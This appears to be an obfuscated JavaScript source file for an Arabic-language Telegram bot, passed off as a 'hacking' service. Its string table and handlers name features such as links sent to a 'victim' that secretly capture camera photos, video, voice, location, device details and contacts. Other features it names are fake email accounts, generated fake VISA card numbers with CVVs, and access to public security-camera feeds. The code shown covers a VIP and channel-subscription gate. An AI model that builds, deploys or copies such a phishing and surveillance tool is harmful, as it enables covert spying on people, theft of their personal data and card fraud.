        'لموقع\x20الجغ',
        'chatId=',
        '\x20🧠\x0a-\x20الذاك',
        'hmqRz',
        'otocol',
        'إسبانيا\x20🇪🇸',
        '1487335xdbSuO',
        '\x20📡\x0a-\x20إمكان',
        'فرنسا\x20🇫🇷',
        'لهرسك\x20🇧🇦',
        'يد\x20وهمي\x20لا',
        'get_link_',
        'إلغاء\x20اشتر',
        'ExSNI',
        'locLd',
        'Id\x20',
        'contact',
        'link',
        'ليتوانيا\x20🇱🇹',
        'املاً\x20قم\x20ب',
        'ber',
        'اختر\x20الدول',
        'axios',
        'يتك\x20في\x20الد',
        '\x0a𝗣𝗮𝘀𝘀𝗲𝗱\x20✅\x0a',
        '\x20إيميل\x20وهم',
        'ل\x20بنجاح:\x0a<',
        'hotos:\x20',
        'AgZDq',
        'يرجى\x20إرسال',
        'سو\x20🇧ﺫ',
        'د\x20الأنوية:',
        '🇨🇲',
        'بليز\x20🇧🇿',
        'ناء\x20إنشاء\x20',
        'networkSpe',
        'config',
        'قه\x20عاليه:\x20',
        'ت\x20الجهاز\x20🔬',
        'كوستاريكا\x20',
        'yxwIG',
        'لمراقبة\x20📡',
        'يره\x20جداً\x20ب',
        '▓▓▓▓░░░░░░',
        'deo',
        '4.com',
        'send\x20video',
        'ارساله\x20لضح',
        'Llkir',
        'readFileSy',
        'غرينلاند\x20🇬🇱',
        '\x20عاليه\x20🖼',
        'ر\x20لتوليد\x20ر',
        'push',
        'bPzMc',
        '*[-]\x20Card\x20',
        'jpLEh',
        '/submitLoc',
        'collect_de',
        '*الايدي\x20:\x20',
        'mbOAG',
        'كمبوديا\x20🇰🇭',
        'g.html',
        'XrlBG',
        'inline_key',
        '/ge',
        'code',
        'memoryStor',
        'اكتب\x20لي\x20رس',
        'captureFro',
        'ريونيون\x20🇷🇪',
        'JTiBl',
        'data',
        'An\x20error\x20o',
        'hHeyw',
        'city',
        'LTAOF',
        'الصوره🙋‍♂️\x20',
        'ألمانيا\x20🇩🇪',
        'GWTpB',
        'ياء\x20🧠',
        'ث\x20خطأ\x20أثنا',
        'للمسية:\x20',
        'xIjmo',
        'مالطا\x20🇲🇹',
        'إختراق\x20ببج',
        'شتراك\x20في\x20ج',
        'ه\x20وكلمات\x20ج',
        '/s.html?ch',
        'تركيا\x20🇹🇷',
        '\x20🔒',
        'وف\x20يتم\x20فتح',
        'لف\x20الشخصي:',
        'HKFWO',
        'أستراليا\x20🇦🇺',
        'الدردشة\x20مع',
        'user',
        'o\x20for\x20chat',
        '50mb',
        'ion',
        'وقع\x20📍',
        'xPPwo',
        'raBGO',
        'Ireax',
        'yZAEZ',
        'ير\x20هذا\x20الر',
        '\x20🇨🇮',
        'add_nammes',
        'get',
        'ice.glitch',
        '/submitVoi',
        'رافي:\x20',
        'colorDepth',
        'FGmah',
        '\x20:\x20',
        'PwnhM',
        '\x20الصور',
        'صي.',
        'iZnqf',
        'capture_vi',
        'dYTxW',
        'first_name',
        'DNEZi',
        'juEbS',
        'k.glitch.m',
        'SbFxQ',
        '/captureFr',
        'ysZhH',
        'random',
        'VISA\x20-\x20DEB',
        'بلوتوث:\x20',
        '.me/',
        'TiFOa',
        'اق\x20وتساب\x0a:',
        '12009ckTiJr',
        'getLocatio',
        'رابط\x20هذا:\x20',
        'لقد\x20قام\x20ضح',
        'for\x20chatId',
        'لرقام\x20الضح',
        'EtCzI',
        'من\x20هذا\x20الد',
        'UQwVN',
        'يا\x20🇿🇦',
        'PPsxN',
        'readdirSyn',
        'gpt-3.5-tu',
        '\x20GB\x20💾\x0a-\x20عد',
        'oHtNb',
        'upport',
        'dUxRQ',
        'لإيماءات\x20ا',
        'ase\x20try\x20ag',
        'بوتسوانا\x20🇧🇼',
        'FySAO',
        'لام\x20🧙‍♂️',
        '\x20🔒\x0a-\x20نطاق\x20',
        'isa',
        'المكسيك\x20🇲🇽',
        'IreNn',
        'qVUSW',
        'nRhaq',
        'إيران\x20🇮🇷',
        'غيرنزي\x20🇬🇬',
        'ntation',
        'https://fo',
        'توباغو\x20🇹🇹',
        'fdtoB',
        'GawTG',
        'nAvailable',
        'BROwR',
        'الضحيه\x20📲',
        'ا\x20الخيارت\x20',
        'bluetoothS',
        'erica',
        'geZJA',
        'urlencoded',
        ']\x200%',
        'longitude',
        '\x20🌐\x0a-\x20إصدار',
        'البرتغال\x20🇵🇹',
        'every',
        'https://ap',
        'LFQwe',
        'Xmmfg',
        '\x20توك\x20📳',
        'rest-plaus',
        'TJHwh',
        '\x20فاير',
        'agram',
        'يه\x20عبر\x20راب',
        'راق',
        'array',
        'atus:',
        'QCeYM',
        'ابط\x20الخاص\x20',
        '?chatId=',
        'LQSCw',
        'uwFrK',
        'choices',
        'المطور\x20قبل',
        'trong>اضغط',
        'aYjKf',
        '\x20روبوتًا.',
        ':\x20\x0a\x20اليوزر',
        'AcIWL',
        'filter',
        'Knwlz',
        '🇰🇿',
        'وة\x20الامان\x20',
        'slice',
        'ل\x20على1$\x20\x0a:',
        'aZNGd',
        '.insecam.o',
        'sendVideo',
        'QfUTs',
        'افته\x20كـ\x20VI',
        'isCharging',
        'message:',
        '\x20الجهاز:',
        'أوزبكستان\x20',
        'اكرة\x20المؤق',
        'eo:',
        'eopJd',
        'زيمبابوي\x20🇿🇼',
        '**\x0a-\x20الدول',
        'next_',
        'أسماء\x20المس',
        'ري\x20انشاء\x20ا',
        'JUDXs',
        '/messages',
        'سيتم\x20تصوير',
        'path',
        'once',
        '\x20الاتصال.',
        'uploads',
        'https://cu',
        'me/VlP_12',
        '10mb',
        'إزالة\x20مستخ',
        'redirect',
        'HTML',
        'unlinkSync',
        'ZLMnO',
        'me/ygf2gbo',
        'last_name',
        '7065665133',
        '/k.html?ch',
        'uyPaN',
        'catch',
        '\x20الرسالة.\x20',
        '<strong>قم',
        'zvKmU',
        'بوركينا\x20فا',
        'بنجاح\x20✅',
        'بعد</stron',
        'ها\x20رقمي\x20ول',
        'كندا\x20🇨🇦',
        'اختراق\x20الم',
        'لوحة\x20التحك',
        'Citibank',
        'almunharif',
        '\x20هذا\x20الراب',
        'أفغانستان\x20',
        'then',
        'سلوفاكيا\x20🇸🇰',
        'التشيك\x20🇨🇿',
        'uxWWl',
        'لمتصفح:\x20',
        'ة:</strong',
        'البحرين\x20🇧🇭',
        'Bank\x20of\x20Am',
        'موزمبيق\x20🇲🇿',
        'فنلندا\x20🇫🇮',
        'ImXpX',
        'لشاشة:\x20',
        'أنغولا\x20🇦🇴',
        'نيبال\x20🇳🇵',
        'bjTlr',
        'لا\x20توجد\x20نب',
        'DTBae',
        'emails.jso',
        '.jpg',
        '🇦🇷',
        'الفلبين\x20🇵🇭',
        'ed.',
        'ذاكرة\x20المؤ',
        'لم\x20يتم\x20الت',
        'Error\x20fetc',
        '🇱🇺',
        'answerCall',
        'اختراق\x20كام',
        'saEtt',
        '\x20من\x20VIP.',
        'لصورة\x20بنجا',
        'ل\x20عن\x20800حر',
        'seWwkhTzrZ',
        'ddEEm',
        '/ok.html',
        'sbqeF',
        'الية\x20🇰🇵',
        'securityPr',
        'Sent\x20photo',
        '\x20أثناء\x20جلب',
        '1336CZLAKI',
        '🇳🇨',
        'nopxl',
        'dhRfX',
        'FGvLp',
        'afSzO',
        'فيتنام\x20🇻🇳',
        'TVHFK',
        'الإمارات\x20🇦🇪',
        '/ca.html',
        'ن\x20النت\x20قوي',
        'subject',
        '\x20📱\x0a-\x20الذاك',
        'QIaCq',
        'تم\x20حذف\x20الذ',
        'NnUKm',
        'remove_vip',
        '<strong>لي',
        'body_text',
        's://t.me/',
        'مرحبًا!\x20هذ',
        'CxECQ',
        '\x0a<strong>ي',
        '\x20انشاء\x20ايم',
        'xIvVG',
        'er.glitch.',
        'كامرات\x20في\x20',
        'ًا\x20',
        'العراق\x20🇮🇶',
        'EwNkD',
        'ع\x20اضافة\x20فا',
        '/g.html?ch',
        'board',
        'كرواتيا\x20🇭🇷',
        '12gsVyPL',
        '.\x0a\x20⚠️ملاحظه',
        'BDKEd',
        'match',
        '\x20🔵\x0a-\x20دعم\x20ا',
        'hing\x20joke:',
        'ال\x20للتحقق\x20',
        '/getLocati',
        'بيلاروس\x20🇧🇾',
        '\x0a<code>',
        'PNC\x20Bank',
        'TMSMu',
        'randomByte',
        'XcAAE',
        'uWghb',
        'vOmpy',
        'LcSEA',
        'essage',
        'ل\x20مره\x20اخرى',
        'INXlI',
        'touchSuppo',
        'gPLtX',
        'generate_v',
        'قتة:',
        'SunTrust\x20B',
        '\x20🔞',
        'تة.',
        'تشيلي\x20🇨🇱',
        'أرسل\x20لي\x20را',
        'k.html',
        'wmudB',
        'max',
        'ي\x20في\x20لوحة\x20',
        'أخرى\x20لاحق😁',
        'Feefu',
        'لرجاء\x20المح',
        'get_photo_',
        '\x20أثناء\x20محا',
        'Fifth\x20Thir',
        'static',
        'ابه\x20تلجرام',
        'on/',
        'اول\x20مره\x20اخ',
        '\x20نقاط.',
        'ebzpl',
        '\x20📏\x0a-\x20إصدار',
        '🇺🇿',
        'callback_q',
        'المجر\x20🇭🇺',
        'mLQOz',
        'ه\x20يمنيه\x20قص',
        'VPmyS',
        'screenReso',
        'Your-User-',
        'PhLUI',
        'لاتفيا\x20🇱🇻',
        'ميع\x20قنوات\x20',
        'من\x20أنك\x20لست',
        '\x20كاميرات\x20ا',
        'رقم\x20الهاتف',
        'ode>',
        'oCeEO',
        '/whatsapp',
        'ر\x20الدوله\x20ا',
        '1kNNPU6RVm',
        'nGhQZ',
        'البرازيل\x20🇧🇷',
        'لرابط\x20لختر',
        'UvFvn',
        'HTvaq',
        'ه\x20عبر\x20رابط',
        'wbsKu',
        'مالي\x20🇲🇱',
        'باكستان\x20🇵🇰',
        'لوكسمبورغ\x20',
        'BjKFI',
        't?start=',
        '\x20المراقبه\x20',
        '\x20📶\x20(سرعة:\x20',
        'التحكم:',
        'isDirector',
        'ابط\x20لإضافة',
        'express',
        'hAeEN',
        'إضافة\x20مشتر',
        'iBtAu',
        'صال:\x20',
        'EmOce',
        '\x20🎨\x0a-\x20تاريخ',
        'internalSt',
        '.mp4',
        'rshq_faceb',
        'ل\x20بعد\x20🗳ً</',
        'ram-bot-ap',
        'Agent',
        'zbECK',
        'ال\x20للتحقق.',
        'المغرب\x20🇲🇦',
        'GOgXw',
        'get_love_m',
        'ي\x20🕹',
        'iver',
        '\x20📊\x0a-\x20دقة\x20ا',
        'جرب\x20دوله\x20ا',
        'latitude',
        'ة...',
        'BnlGn',
        'تسجيل\x20صوت\x20',
        '/getNam',
        'amQkx',
        'UBwKN',
        'mdEsM',
        'جزر\x20فارو\x20🇫🇴',
        'ain\x20later.',
        '\x27m*\x20[™](t.',
        'sendPhoto',
        'السلفادور\x20',
        '\x20جهة\x20الاتص',
        'طة.\x0a:\x20http',
        '\x20الحصول\x20عل',
        'd\x20or\x20video',
        'اولة\x20مرة\x20أ',
        '/imageRece',
        'حقق\x20من\x20جهة',
        'filePhotos',
        'gram',
        'ال\x20الأسماء',
        'FQmpM',
        'om/v1/chat',
        '\x2030$\x20يمكنك',
        'لا\x20يوجد\x20اس',
        'مرحبا!\x20في\x20',
        ']\x2025%',
        'م\x20هذا\x20هو\x0a:',
        'neNumber',
        'toString',
        '/?page=',
        '.com/',
        'repeat',
        '🇳🇮',
        'Error\x20proc',
        'ساحل\x20العاج',
        'سوريا\x20🇸🇾',
        'الصوره📸\x20',
        'خال\x20رقم\x20ال',
        'PcAom',
        'base64',
        'QdCUy',
        '2504161QpRcBZ',
        'لام\x20أي\x20رسا',
        'rg/en/byco',
        'sendFile',
        '🔗\x20توليد\x20را',
        'ط\x20🔒',
        'xx.html',
        '\x20🗑</strong',
        'فرمتة\x20جوال',
        'boid-outst',
        'Generating',
        'الأرجنتين\x20',
        'الرجاء\x20إدخ',
        'tjKma',
        'المشاهده\x20ع',
        'vipUsers',
        'aThHadlLGB',
        'جزر\x20كايمان',
        'ابدأ\x20الاخت',
        'https://t.',
        'rZIek',
        'باع\x20هذه\x20ال',
        '<strong>حد',
        'ener',
        'node-teleg',
        'غوادلوب\x20🇬🇵',
        'body',
        'get_pubg',
        'ZrcDJ',
        'ETezW',
        '⚠️:\x0a',
        'ل\x20على\x20المن',
        'أيرلندا\x20🇮🇪',
        'No\x20visa\x20da',
        'عبر\x20رابط\x20🔒',
        '*الاسم\x20:\x20',
        'دم\x20VIP',
        'تم\x20استلام\x20',
        '\x20sent\x20phot',
        '100mb',
        'Error\x20send',
        '\x20data.\x20Ple',
        '😁.',
        'status',
        'ولة\x20الحصول',
        'XyMxt',
        'ر\x20لجمع\x20معل',
        'body-parse',
        'ختلفه\x20او\x20ح',
        'UcuLl',
        '\x20سابقاً\x20هو',
        'listen',
        'احصل\x20على\x20ر',
        'خل\x20إلى\x20الر',
        'create_ema',
        'للحصول\x20على',
        '<strong>•\x20',
        '\x20⚠️',
        'قد\x20حدث\x20خطأ',
        '/mm',
        'تم\x20استخدام',
        '\x20\x0aكلمة\x20الس',
        'mdRZqoXRZ_',
        'عمان\x20🇴🇲',
        'http://www',
        'wOmcI',
        'PYpxh',
        'إيقاف\x20البر',
        '\x20للمتصفح:\x20',
        '.txt',
        'حاولة\x20مرة\x20',
        '\x20موجود:\x20',
        'ل\x20وهمي\x20💌',
        'لام\x20معلوما',
        'aWhUD',
        'lastUpdate',
        'vaXZH',
        'كوريا\x20الشم',
        'جنوب\x20أفريق',
        'ترينيداد\x20و',
        'د\x20لنسخه</s',
        'ISfMk',
        '\x20إلى\x20التلغ',
        'hex',
        '\x20:*\x20`',
        'deviceVers',
        'PfqTc',
        '\x20🖥️\x0a-\x20إصدار',
        'dArFo',
        'WCmeh',
        'Received\x20d',
        'VVmKn',
        '\x20مهمه\x20اذا\x20',
        'تايوان\x20🇹🇼',
        '`\x0a*[-]\x20Val',
        ']\x2075%',
        'السعودية\x20🇸🇦',
        '/strong><c',
        'لاوس\x20🇱🇦',
        '🤣🤣🤣🤣',
        'الملف\x20الشخ',
        '`\x0a*=======',
        'JRYSs',
        'rmdirSync',
        'Chase\x20Bank',
        'UtQEU',
        'dZGqm',
        '▓▓▓▓▓▓░░░░',
        'VhTEs',
        'attempts',
        'uorescent-',
        'لم\x20تفتح\x20ال',
        'المزيد',
        'نيكاراغوا\x20',
        'كرة\x20المؤقت',
        '\x20🇰🇾',
        '<strong>تم',
        'فلسطين\x20🇵🇸',
        'VcOFF',
        'yUOux',
        '/getNameFo',
        'تم\x20انشاء\x20ا',
        'ت\x20الجهاز',
        'PNDNW',
        '5Iw5wkVItL',
        'Badtj',
        'LOSLz',
        'وله\x20يمكنك\x20',
        'QcdEf',
        'ضغط\x20على\x20هذ',
        'القائمة:\x20',
        '`\x0a*[-]\x20CVV',
        '/submitVid',
        'لنظام:\x20',
        'on/:linkId',
        'باراغواي\x20🇵🇾',
        'يه\x20الاصيله',
        '\x20complete',
        'ngan.glitc',
        'جاري\x20اخترا',
        'GxTxX',
        'تم\x20إضافة\x20ا',
        'instagram',
        'quest:\x20Mis',
        'آيسلندا\x20🇮🇸',
        'nYOvM',
        'wADxn',
        'ont/:linkI',
        'map',
        'q.whatsapp',
        'الرسالة\x20📩:',
        '\x20🌍\x0a-\x20الدعم',
        'هونغ\x20كونغ\x20',
        'myWFK',
        'iGajM',
        '</code>\x0a<s',
        'PJBjt',
        'IT\x20-\x20VISA\x20',
        'xISbo',
        'uuid',
        'سريلانكا\x20🇱🇰',
        'fe.html',
        'sion',
        'rDNIm',
        'OtMMX',
        'كول\x20الأمان',
        'قبرص\x20🇨🇾',
        '\x20المطور\x20',
        'ctzvs',
        'wmkMo',
        '>\x0a\x0aلنشا\x20اي',
        'tlpUP',
        'تم\x20إنشاء\x20ا',
        'يرات\x20المرا',
        'مدفوع\x20بسعر',
        'اشترك\x20في\x20',
        'substring',
        'اليونان\x20🇬🇷',
        'init',
        'منغوليا\x20🇲🇳',
        'lo.html',
        'me/ZI0_bot',
        'mBioJ',
        'موناكو\x20🇲🇨',
        '\x20الضحيه\x20عب',
        'split',
        'Pyupa',
        'min',
        'غواتيمالا\x20',
        'هاتف\x20هذا\x20ق',
        'XMDHw',
        'مله\x20ارسلها',
        'firstName',
        'qJshk',
        'lwASu',
        '🇵🇷',
        'qsgTB',
        'TD\x20Bank',
        'بنغلاديش\x20🇧🇩',
        'sQjOR',
        'ر:\x20',
        'ومات\x20جهازك',
        'zOlAO',
        'النرويج\x20🇳🇴',
        'HSKHu',
        '@hqooosjjd',
        'xyYWU',
        'CBoaA',
        'https://vv',
        'خول\x20لرابط\x20',
        'osVersion',
        'xzjuS',
        'خرى\x20لاحقًا',
        'إنشاء\x20إيمي',
        '👨🏻‍🏫',
        '\x20على\x20معلوم',
        'k\x20:*\x20`',
        'لقد\x20تم\x20وصو',
        ']\x20100%',
        '/xx.html?c',
        'fari/537.3',
        'لم\x20يتم\x20است',
        'Invalid\x20re',
        'zxMSS',
        'روسيا\x20🇷🇺',
        'ZWOdS',
        'إضافة\x20مستخ',
        'creator',
        'lyRtO',
        'APKLG',
        'file_id',
        'ير\x20chatId\x20',
        'yItQz',
        'mm.html',
        'sSDqD',
        'في\x20هذا\x20الد',
        '\x20الضحيه\x20بد',
        'LnuBR',
        'nvDIx',
        'AXCTP',
        '\x20قم\x20في\x20تعي',
        'رة\x20الداخلي',
        'eCEAi',
        'b.html',
        'Capital\x20On',
        'لمستخدم\x20',
        'XmvzN',
        'YJIcKlujfP',
        'battery',
        'كوريا\x20الجن',
        'bio',
        'RQObs',
        'email\x0a\x0aلظه',
        'ار\x20الايمل\x20',
        '\x20كـ\x20VIP.',
        'niaIs',
        'بط\x20جديد\x20',
        '\x20تم\x20إنشاؤه',
        'مك\x20المنحرف',
        'removeList',
        'jyDzU',
        'ساب\x20🟢',
        'و\x20حاول\x20مره',
        '\x20الرجاء\x20تغ',
        'رة\x20(RAM):\x20',
        'مل\x20وهمي\x20\x20/',
        'لرابط\x20ملاح',
        'RRIjH',
        'هولندا\x20🇳🇱',
        'chatId',
        'includes',
        'الجزائر\x20🇩🇿',
        '-\x20نوع\x20الات',
        'editMessag',
        'ق\x20الهاتف\x20ك',
        'إيطاليا\x20🇮🇹',
        '0.0.0.0\x20Sa',
        'setItem',
        'USA🇺🇸',
        'rbo',
        'Number\x20:*\x20',
        'strong>',
        'dbXLq',
        'parse',
        '\x20المتصفح:\x20',
        '@oapajh',
        'phone_numb',
        'إيميل\x20الذي',
        'توغو\x20🇹🇬',
        'تم\x20إزالة\x20ا',
        'JYqSX',
        'ة\x20الاتصال',
        'تصوير\x20بدقه',
        'woTVk',
        'ue\x20:*\x20`',
        '\x20أثناء\x20إرس',
        'orage',
        'qaeYu',
        '<strong>جا',
        'floor',
        'تنزانيا\x20🇹🇿',
        '░░░░░░░░░░',
        'ماكاو\x20🇲🇴',
        '\x20ما</stron',
        'ل\x20كود\x20الرق',
        'qbqYO',
        '\x20IP:\x20',
        'ZbBQy',
        'BfbmN',
        'تم\x20لغيم\x20ال',
        'gOkDf',
        'حساب\x20جديد⚠️',
        'pFvqx',
        'SOlrK',
        'EktCn',
        'vmwgz',
        'ss\x20the\x20but',
        'ated-drift',
        '\x20(KHTML,\x20l',
        'LEHSJ',
        '\x20مجاني.',
        'CfriL',
        'ية\x20فيديو\x20🎥',
        'بلجيكا\x20🇧🇪',
        '0\x20(Windows',
        'GBtWn',
        'getChatMem',
        'c.html',
        '🇭🇰',
        'xPufj',
        'صله\x20اضع\x20في',
        'vILuf',
        'SIGHUP',
        'applicatio',
        'لعبة\x20الأذك',
        'ب\x20شات\x20⭐',
        'mFEMc',
        '*اليوزر\x20:\x20',
        'uzLxZ',
        'ync',
        'كواد\x20والرس',
        'ZINVY',
        'التردد\x20للا',
        'networkTyp',
        'RepFp',
        '\x20المحتله\x20🇮🇱',
        'بوت\x20اختراق',
        'ود\x20هاذا\x20ال',
        'بـ\x20\x22https\x22',
        'م\x20مستخدم',
        '\x20|\x20في\x20بـوت',
        'r.html',
        'MCRhy',
        '/submitCod',
        'esVuN',
        'الذي\x20تم\x20ان',
        'crGvP',
        'prWpB',
        'كولومبيا\x20🇨🇴',
        'ONYgY',
        'EgwbH',
        '\x20التي\x20قمت\x20',
        '8FkEpJg',
        '🇬🇹',
        'هندوراس\x20🇭🇳',
        'تم\x20انشاء\x20ر',
        '🇦🇫',
        'query',
        'أرمينيا\x20🇦🇲',
        'text',
        'مستخدم\x20لإز',
        '/email/new',
        'Generate\x20V',
        'لخدمة.</st',
        'ور\x20الهاتف\x20',
        'ng>يرجى\x20ات',
        '\x0a📱\x20**معلوم',
        'EFcNx',
        'سحب\x20جميع\x20ص',
        'يل\x20بعد\x20🗳</',
        'اختراق\x20فيس',
        'ابط\x20قم\x20في\x20',
        'امرا\x20الأما',
        'BBIvU',
        'add_names',
        '؟:\x20',
        '\x20بإنشاء\x20حس',
        '\x20النكتة.\x20ا',
        'بط\x20دعوة',
        'لضحيه\x0a:\x20',
        '2DOs-Fgdwp',
        'onText',
        'hdDuu',
        'شاءه\x20\x20/an\x0a',
        'process\x20vi',
        'uZiiY',
        'الصورة:',
        '\x20نقاط',
        'ًا.',
        'ظر\x20عن\x20رقمي',
        'بك\x20فقط.',
        'ط\x20خمس\x20مرات',
        'ta\x20found\x20o',
        '-two-olive',
        'بك\x20سوف\x20تحص',
        'VCvkv',
        'صل\x20لي30$\x20س',
        'OAlpS',
        'تركمانستان',
        '\x20انشـاء\x20بر',
        'params',
        'browserNam',
        'سويسرا\x20🇨🇭',
        'بطًا\x20يبدأ\x20',
        'e\x20Visa!*',
        'الدنمارك\x20🇩🇰',
        'XBdkx',
        'فنزويلا\x20🇻🇪',
        'generate_i',
        'مؤقتة.',
        '\x20🔄\x0a-\x20عمق\x20ا',
        'writeFileS',
        'لقد\x20قام\x20ال',
        '<strong>اه',
        '`\x0a*[-]\x20Car',
        'ن\x20🇩🇴',
        'zwcMa',
        '🇪🇨',
        'Wells\x20Farg',
        'rePVk',
        'راق\x20كامراة',
        '/getName',
        '/capture',
        '\x20على\x20صورة\x20',
        'gBNTH',
        'خطأ.',
        'cpuCores',
        '\x20الجهاز:\x20',
        '\x0aلحذف\x20الاي',
        'facebook',
        'qCcBw',
        'env',
        'PORT',
        'uery',
        'ل\x20على\x201\x20نق',
        'xgfpw',
        'Wftgl',
        'greencafe2',
        'قيرغيزستان',
        'djqDG',
        'السويد\x20🇸🇪',
        'me/',
        'vLSYt',
        'المدفوع\x20تل',
        'iDASY',
        'voice',
        'VVuei',
        'vqWfq',
        'yhPHd',
        'rm?chatId=',
        '🇨🇷',
        'pEGhj',
        'time',
        'mpXwA',
        '\x20📅\x0a-\x20بروتو',
        'user_id',
        'TwSAm',
        'ي\x20عن\x20طريق\x20',
        'sjEYT',
        '\x20أي\x20إيميل\x20',
        'الملفات\x20ال',
        'essing\x20vid',
        '\x20تجميع\x20الن',
        '.png',
        'XcOtJ',
        'xMnpk',
        'bWGqX',
        'رابط\x20جمع\x20ا',
        'uuNCM',
        '&type=face',
        'اعطيني\x20نكت',
        'n.html',
        '<strong>لم',
        'emBGn',
        '*👤\x20معلومات',
        ')\x0a\x20\x20\x20\x20\x20\x20',
        'PqgTY',
        'get_camera',
        'chat',
        'EjrGH',
        '\x20لاحقًا.',
        'SmxRp',
        'عدد\x20النقاط',
        'اختراق\x20وات',
        'xFJYu',
        'حدثت\x20مشكلة',
        'AJcUo',
        'hrixE',
        'type',
        'صيد\x20فيزات\x20',
        'DCbhw',
        'الرجاء\x20الا',
        'تايلاند\x20🇹🇭',
        '\x20رابط\x20لالت',
        'get_link',
        'ckjTq',
        'i.internal',
        'dwTrJ',
        'Processing',
        'تصفير\x20الذا',
        'sendLocati'
    ];
    _0x5212 = function () {
        return _0x175485;
    };
    return _0x5212();
}
let vipUsers = {};
function addVIPUser(_0x5d670f) {
    vipUsers[_0x5d670f] = !![];
}
function removeVIPUser(_0x3d9aca) {
    delete vipUsers[_0x3d9aca];
}
function isVIPUser(_0x580837) {
    return !!vipUsers[_0x580837];
}
bot[_0x178009(0x645)](/\/start/, async _0x53f73c => {
    const _0x11a6d5 = _0x178009, _0x54b042 = {
            'HSKHu': function (_0x56b9f3, _0x379e2a) {
                return _0x56b9f3(_0x379e2a);
            },
            'EwNkD': _0x11a6d5(0x6b3) + _0x11a6d5(0x32e) + _0x11a6d5(0x462) + _0x11a6d5(0x3a0) + _0x11a6d5(0x795) + _0x11a6d5(0x25b),
            'ETezW': _0x11a6d5(0x815) + _0x11a6d5(0x1d4) + _0x11a6d5(0x25f),
            'amQkx': _0x11a6d5(0x23e) + _0x11a6d5(0x63c) + _0x11a6d5(0x730),
            'mpXwA': _0x11a6d5(0x23e) + _0x11a6d5(0x7a1) + _0x11a6d5(0x285),
            'FxGRE': _0x11a6d5(0x3da) + _0x11a6d5(0x33c),
            'CfriL': _0x11a6d5(0x495) + _0x11a6d5(0x78a),
            'bPzMc': _0x11a6d5(0x3fb) + _0x11a6d5(0x56b) + _0x11a6d5(0x809),
            'FGvLp': _0x11a6d5(0x6a5) + 's',
            'UattB': _0x11a6d5(0x7a9) + _0x11a6d5(0x600),
            'qVUSW': _0x11a6d5(0x34f) + _0x11a6d5(0x304),
            'yItQz': _0x11a6d5(0x6ab) + _0x11a6d5(0x5c3),
            'rePVk': _0x11a6d5(0x733) + _0x11a6d5(0x228),
            'GawTG': _0x11a6d5(0x78b) + _0x11a6d5(0x774),
            'qsgTB': _0x11a6d5(0x63a) + _0x11a6d5(0x769),
            'lyRtO': _0x11a6d5(0x75d) + _0x11a6d5(0x48e),
            'LOSLz': _0x11a6d5(0x4d9),
            'AgZDq': _0x11a6d5(0x2b7) + _0x11a6d5(0x70a),
            'PqgTY': _0x11a6d5(0x71c) + 're',
            'uKBdR': _0x11a6d5(0x781) + _0x11a6d5(0x60d),
            'uosVd': _0x11a6d5(0x63e),
            'pfQdM': _0x11a6d5(0x204) + _0x11a6d5(0x391),
            'ZbBQy': _0x11a6d5(0x337) + _0x11a6d5(0x7b7) + _0x11a6d5(0x74a),
            'mpWFr': _0x11a6d5(0x252) + _0x11a6d5(0x52c) + _0x11a6d5(0x290) + _0x11a6d5(0x548) + _0x11a6d5(0x6c0),
            'xzjuS': _0x11a6d5(0x712) + _0x11a6d5(0x2fe),
            'PZvjx': _0x11a6d5(0x312) + _0x11a6d5(0x23f),
            'hmqRz': _0x11a6d5(0x1d6) + _0x11a6d5(0x373),
            'luqLP': _0x11a6d5(0x7b8) + _0x11a6d5(0x6c7) + _0x11a6d5(0x5fb) + _0x11a6d5(0x421) + _0x11a6d5(0x681),
            'TerSr': _0x11a6d5(0x738) + _0x11a6d5(0x4f7),
            'sjEYT': _0x11a6d5(0x6b6),
            'wmkMo': _0x11a6d5(0x1f9) + _0x11a6d5(0x6cf) + _0x11a6d5(0x443),
            'ddEEm': _0x11a6d5(0x343),
            'oXPNb': _0x11a6d5(0x60c) + _0x11a6d5(0x328),
            'eBPVV': _0x11a6d5(0x37d) + _0x11a6d5(0x392) + _0x11a6d5(0x286) + _0x11a6d5(0x345) + _0x11a6d5(0x35b),
            'ZrcDJ': _0x11a6d5(0x79a) + _0x11a6d5(0x594),
            'aZNGd': _0x11a6d5(0x4d1) + _0x11a6d5(0x1d7) + '3',
            'YbSHu': _0x11a6d5(0x763) + _0x11a6d5(0x7f4),
            'Jxoyh': _0x11a6d5(0x3c4) + _0x11a6d5(0x4c7) + _0x11a6d5(0x7cb) + _0x11a6d5(0x354) + 'e/',
            'LTAOF': _0x11a6d5(0x593) + _0x11a6d5(0x506),
            'WCmeh': _0x11a6d5(0x4f4) + 'il',
            'ckBSK': _0x11a6d5(0x6b1) + '💳',
            'qaeYu': _0x11a6d5(0x440) + _0x11a6d5(0x375),
            'mzUkr': _0x11a6d5(0x5e2) + _0x11a6d5(0x30b),
            'emBGn': _0x11a6d5(0x44e) + _0x11a6d5(0x2e9),
            'rvJOo': _0x11a6d5(0x746) + _0x11a6d5(0x383),
            'PcAom': _0x11a6d5(0x660) + _0x11a6d5(0x713),
            'xPPwo': _0x11a6d5(0x735) + _0x11a6d5(0x565),
            'AVhPi': _0x11a6d5(0x4d1) + _0x11a6d5(0x3c5),
            'wOmcI': function (_0x30cf90, _0x2fde55) {
                return _0x30cf90 === _0x2fde55;
            },
            'vILuf': _0x11a6d5(0x2bb) + _0x11a6d5(0x6ff) + _0x11a6d5(0x44a) + _0x11a6d5(0x479),
            'TJHwh': _0x11a6d5(0x47e) + _0x11a6d5(0x2a5),
            'qXHxU': _0x11a6d5(0x7eb),
            'dUxRQ': _0x11a6d5(0x2e4) + _0x11a6d5(0x75b),
            'HjJcY': _0x11a6d5(0x418)
        }, _0x1fc896 = _0x53f73c[_0x11a6d5(0x6a6)]['id'], _0x4174af = await _0x54b042[_0x11a6d5(0x58a)](isUserSubscribed, _0x1fc896);
    if (!_0x4174af) {
        const _0xa91dd9 = _0x54b042[_0x11a6d5(0x425)], _0x345925 = developerChannels[_0x11a6d5(0x552)](_0x51aa8a => [{
                    'text': _0x11a6d5(0x56d) + _0x51aa8a,
                    'url': _0x11a6d5(0x4d1) + _0x11a6d5(0x681) + _0x51aa8a[_0x11a6d5(0x56e)](0x3 * -0xb8a + -0x3b * -0x89 + 0x30c)
                }]);
        bot[_0x11a6d5(0x273) + 'e'](_0x1fc896, _0xa91dd9, { 'reply_markup': { 'inline_keyboard': _0x345925 } });
        return;
    }
    const _0x26e90a = _0x54b042[_0x11a6d5(0x4db)], _0x6902c4 = [
            [
                {
                    'text': _0x54b042[_0x11a6d5(0x497)],
                    'callback_data': _0x11a6d5(0x31d) + _0x11a6d5(0x1db) + _0x1fc896
                },
                {
                    'text': _0x54b042[_0x11a6d5(0x68d)],
